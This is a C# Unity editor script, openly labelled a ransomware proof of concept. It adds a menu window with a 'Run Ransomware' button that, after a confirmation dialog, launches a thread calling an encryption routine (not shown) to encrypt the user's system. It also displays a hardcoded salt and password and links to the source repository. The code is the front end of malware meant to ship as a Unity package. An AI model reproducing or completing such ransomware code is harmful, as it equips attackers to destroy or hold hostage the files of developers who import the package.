using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UnityEditor;
using UnityEngine; 

//Unity is Requred for this.

namespace UnityExample
{
    [InitializeOnLoad]
    public class Main : EditorWindow
    {
        [MenuItem("Unity Ransomware Example/Start Encrypt Files", false, 500)]
        
        public static void ShowWindow()
        {
            Main window = EditorWindow.GetWindow<Main>();
            window.maxSize = new Vector2(650, 400);
            window.minSize = new Vector2(650, 400);
            GUIContent titleContent = new GUIContent("Ransomware Example");
            window.titleContent = titleContent;
        }
        public void OnGUI()
        {
            Debug.Log(".unitypackage Ransomware Example Loaded");
            GUILayout.Label("This is a Test for the Concept.");
            if (GUILayout.Button("Open Sourcecode"))
            {
                Application.OpenURL("https://github.com/none-development/unitypackage-ransomware");
            }
            GUILayout.Label("Press this Button to Start Encrypt you System. Salt: 35, Password: Mei . For Encrypt please use this.");
            if (GUILayout.Button("Run Ransomware"))
            {
                switch (EditorUtility.DisplayDialogComplex(".unity Ransomware", "Do you really want to run the Ransomeware? Meichan assumes no liability for damage to property during the execution of this script.", "Yes, start Ransomware", "No, dont Start", null))
                {
                    case 0:
                        Thread thread = new Thread(() =>
                        {
                            UnityExample.encrypter.Startencrypt(true);
                        });
                        thread.Start();

                        break;
                    case 1:
                        break;
                    case 3:
                        break;
                }
                Debug.LogError("Unrecognized option.");
            }
           
        }
    }
}
